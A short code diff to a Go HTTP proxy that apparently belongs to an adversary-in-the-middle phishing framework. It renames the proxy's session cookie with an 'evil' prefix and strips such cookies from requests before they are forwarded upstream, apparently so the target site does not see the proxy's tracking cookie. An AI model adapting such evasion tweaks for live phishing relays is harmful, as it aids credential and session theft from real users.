@@ -140,7 +140,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 	}
 
-	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
+	p.cookieName = "evil" + GenRandomString(4) // TODO: make cookie name identifiable
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
@@ -877,6 +877,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+				// Define the substring to check for in cookie names
+				substringToCheck := "evil"
+			
+			    	// Filter out the cookies that contain the substring
+			    	filteredCookies := []*http.Cookie{}
+			    	for _, cookie := range req.Cookies() {
+					if !strings.Contains(cookie.Name, substringToCheck) {
+				    	filteredCookies = append(filteredCookies, cookie)
+					}
+			    	}
+			
+			    	// Clear the existing cookies in the request header
+			    	req.Header.Del("Cookie")
+			
+			    	// Add the filtered cookies back to the request header
+			    	for _, cookie := range filteredCookies {
+					req.AddCookie(cookie)
+			    	}
 			}
 
 			return req, nil
